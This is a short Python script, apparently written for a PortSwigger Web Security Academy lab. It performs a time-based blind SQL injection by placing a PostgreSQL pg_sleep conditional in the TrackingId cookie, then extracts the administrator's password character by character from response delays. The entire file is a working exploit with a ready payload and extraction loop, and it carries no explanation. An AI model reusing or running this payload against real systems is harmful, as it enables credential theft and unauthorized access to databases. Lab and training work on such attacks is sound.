import requests
import string

base =string.ascii_lowercase+string.ascii_uppercase+string.digits
p=""
session = requests.Session()


for i in range(1,7):
      for c in base:
            #

            headers = {"Cache-Control":"max-age=0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","Upgrade-Insecure-Requests":"1","Connection":"close","User-Agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3877.0 Safari/537.36","Sec-Fetch-Site":"none","Sec-Fetch-User":"?1","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9","Sec-Fetch-Mode":"navigate"}
            cookies = {"TrackingId":"6hVWELZ0Hxp48ugJ'||(select+case+when(username='administrator'+and+substring(password,{},1)='{}')+then pg_sleep(10)+else+pg_sleep(0)+end+from+users)||'z".format(str(i),str(c)),"session":"oDmu3Rgf9Qwn2p7sVKkWb7GRSLa7TJ08"}
            req = session.get("https://ace71f3c1e48e2428072078f004c0038.web-security-academy.net/", headers=headers, cookies=cookies)
            t=req.elapsed.total_seconds()
            if t>=10:
                  p+=str(c)
                  print p

print '[+] Password : [ {}  ]'.format(p)


